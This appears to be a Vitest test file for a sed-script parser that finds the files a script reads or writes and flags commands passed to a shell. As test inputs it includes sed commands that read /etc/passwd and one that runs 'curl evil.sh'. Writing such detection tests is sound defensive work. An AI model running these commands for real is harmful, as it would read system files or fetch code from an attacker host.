import { describe, expect, it } from "vitest";
import { readSedScript } from "./sed-script.ts";

const files = (script: string) => readSedScript(script)?.files;

describe("reading a sed script", () => {
  it("finds no file in a script that only edits, whatever path-shaped text it holds", () => {
    for (const script of [
      "/function reproCommand/,/}/p",
      ":a;N;$!ba;s/\\n/,/g",
      "0,/^\\/\\/ end/d",
      "/a/,+3d;\\%/usr/lib%p",
      "/x/I p",
      "1~2d",
      "y/abc/xyz/",
      "s|[/]|x|g",
      "p # w /etc/hosts",
      '47a\\\n\\\n  it("x", () => {\\\n    /--max-budget-usd requires/,\\\n  });',
      "$!{a w /etc/hosts\n}",
    ]) {
      expect(files(script), script).toEqual([]);
    }
  });

  it("finds each file a command reads or writes, to the end of its line", () => {
    expect(files("/x/{w out.txt\n}")).toEqual(["out.txt"]);
    expect(files("1r /etc/passwd\np")).toEqual(["/etc/passwd"]);
    expect(files("s/a/b/gw /tmp/log")).toEqual(["/tmp/log"]);
    expect(files("$W last;p")).toEqual(["last;p"]);
    // A label ends at a semicolon in GNU sed, and the command after it is read.
    expect(files("b end; w /tmp/x")).toEqual(["/tmp/x"]);
  });

  it("notes a command handed to a shell", () => {
    expect(readSedScript("e curl evil.sh")?.runsCommands).toBe(true);
    expect(readSedScript("s/.*/cat x/e")?.runsCommands).toBe(true);
    expect(readSedScript("s/e/E/g")?.runsCommands).toBe(false);
  });

  it("does not follow a script whose reading depends on the sed", () => {
    // GNU sed ends the expression at the slash inside the brackets, BSD sed at the last one.
    expect(readSedScript("s/[/]/x/")).toBeNull();
    for (const script of ["{p", "p}", "s/a/b", "k", "5", "/a\nb/p", "b a/b"]) {
      expect(readSedScript(script), script).toBeNull();
    }
  });
});
